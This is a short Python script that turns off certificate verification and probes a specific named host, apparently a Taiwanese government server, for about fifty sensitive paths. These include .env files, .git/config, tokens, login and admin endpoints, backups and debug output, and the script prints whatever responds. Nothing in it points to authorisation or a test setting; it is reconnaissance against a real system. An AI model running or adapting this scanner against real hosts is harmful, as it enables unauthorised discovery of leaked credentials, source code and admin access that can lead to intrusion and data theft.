import requests, urllib3, ssl
urllib3.disable_warnings()
ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
S = requests.Session(); S.verify=False

paths = [
 "/","/config","/config.json","/app.js","/package.json","/.env","/.env.local","/env",
 "/debug","/debug/vars","/_debug/ndjson","/metrics","/swagger.json","/swagger","/api",
 "/api/config","/config.js","/application.js","/server.js","/index.js","/main.js",
 "/dist/config","/static/config","/assets/config","/conf.json","/settings",
 "/.git/HEAD","/.git/config","/.gitignore","/backup","/admin","/admin/","/login",
 "/Users","/Roles","/Permissions","/token","/auth","/auth/login","/api/login",
 "/health","/status","/version","/info","/docs","/redoc","/openapi.json",
 "/.DS_Store","/node_modules/express/package.json","/routes.js","/controllers.js",
 "/public/config","/js/publicConfig.js","/publicConfig.js","/captcha",
]
for base in ["https://epcr.tpf.gov.tw:4004"]:
    print("\n########", base, "########")
    for p in paths:
        try:
            r = S.get(base+p, timeout=15, allow_redirects=False)
            ct = r.headers.get("content-type","")
            if r.status_code not in (404,401,403) or "json" in ct:
                print(f"{r.status_code:3} len={len(r.content):6} {ct[:30]:30} {p}  :: {r.text[:70].strip()!r}")
        except Exception as e:
            print("ERR", p, type(e).__name__)
print("done")
